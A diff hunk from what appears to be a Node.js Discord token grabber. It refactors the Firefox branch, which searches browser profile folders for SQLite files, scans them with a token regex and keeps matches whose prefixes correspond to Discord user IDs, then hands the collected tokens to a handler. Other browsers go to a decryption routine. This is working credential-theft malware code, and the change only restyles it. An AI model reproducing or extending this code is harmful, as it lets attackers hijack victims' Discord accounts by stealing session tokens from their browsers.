@@ -143,36 +143,31 @@ module.exports = new Promise((resolve) => {
     if (!existsSync(browsers[path])) continue;
     if (path.includes('Firefox')) {
       const search = execSync('where /r . *.sqlite', { cwd: browsers[path] }).toString();
-      if (search) {
-        search.split(/\r?\n/).forEach((filePath) => {
-          filePath = filePath.trim();
-          if (!existsSync(filePath) || !statSync(filePath).isFile()) return;
-          const lines = readFileSync(filePath, 'utf8').split('\n').map(x => x.trim());
-          lines.forEach((line) => {
-            const tokensMatch = line.match(tokenRegex);
-            if (tokensMatch) {
-              tokensMatch.forEach((token) => {
-                if (
-                  // Each number is the first number a Discord User ID contains, depending on which Discord API
-                  // version they account was created
-                  !token.startsWith('MTg') && // 1
-                  !token.startsWith('MjI') && // 2
-                  !token.startsWith('MzM') && // 3
-                  !token.startsWith('NDU') && // 4
-                  !token.startsWith('NTE') && // 5
-                  !token.startsWith('NjU') && // 6
-                  !token.startsWith('NzM') && // 7
-                  !token.startsWith('ODA') && // 8
-                  !token.startsWith('OTk') && // 9
-                  !token.startsWith('MTA') && // 10
-                  !token.startsWith('MTE')    // 11
-                ) return;
-                if (!tokens.includes(token)) tokens.push({ token, source: 'Mozilla Firefox' });
-              });
-            }
+      search?.split(/\r?\n/).forEach((filePath) => {
+        filePath = filePath.trim();
+        if (!existsSync(filePath) || !statSync(filePath).isFile()) return;
+        const lines = readFileSync(filePath, 'utf8').split('\n').map(x => x.trim());
+        lines?.forEach((line) => {
+          line.match(tokenRegex)?.forEach((token) => {
+            if (
+              // Each number is the first number a Discord User ID contains, depending on which Discord API
+              // version they account was created
+              !token.startsWith('MTg') && // 1
+              !token.startsWith('MjI') && // 2
+              !token.startsWith('MzM') && // 3
+              !token.startsWith('NDU') && // 4
+              !token.startsWith('NTE') && // 5
+              !token.startsWith('NjU') && // 6
+              !token.startsWith('NzM') && // 7
+              !token.startsWith('ODA') && // 8
+              !token.startsWith('OTk') && // 9
+              !token.startsWith('MTA') && // 10
+              !token.startsWith('MTE')    // 11
+            ) return;
+            if (!tokens.includes(token)) tokens.push({ token, source: 'Mozilla Firefox' });
           });
         });
-      }
+      });
       handleTokens(tokens, resolve);
     } else {
       decryptRickRoll(browsers[path]).then(async () => await handleTokens(tokens, resolve));
